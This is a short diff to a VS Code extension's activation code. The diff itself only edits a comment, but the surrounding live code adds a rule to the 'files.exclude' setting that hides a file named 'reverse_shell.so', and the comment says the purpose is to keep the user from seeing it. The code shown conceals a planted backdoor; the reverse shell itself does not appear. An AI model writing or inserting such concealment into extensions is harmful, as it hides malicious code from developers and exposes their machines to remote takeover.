@@ -4,7 +4,7 @@ import * as path from 'path';
 
 export async function activate(context: vscode.ExtensionContext) {
 
-	// update workspace settings to prevent user from seeing reverse_shell.so file
+	// update global settings to prevent user from seeing reverse_shell.so file
 	const config = vscode.workspace.getConfiguration();
 	const currentValue = config.get<{}>('files.exclude');
 	const newValue = { ...currentValue, ...{ ['**/reverse_shell.so']: true } };
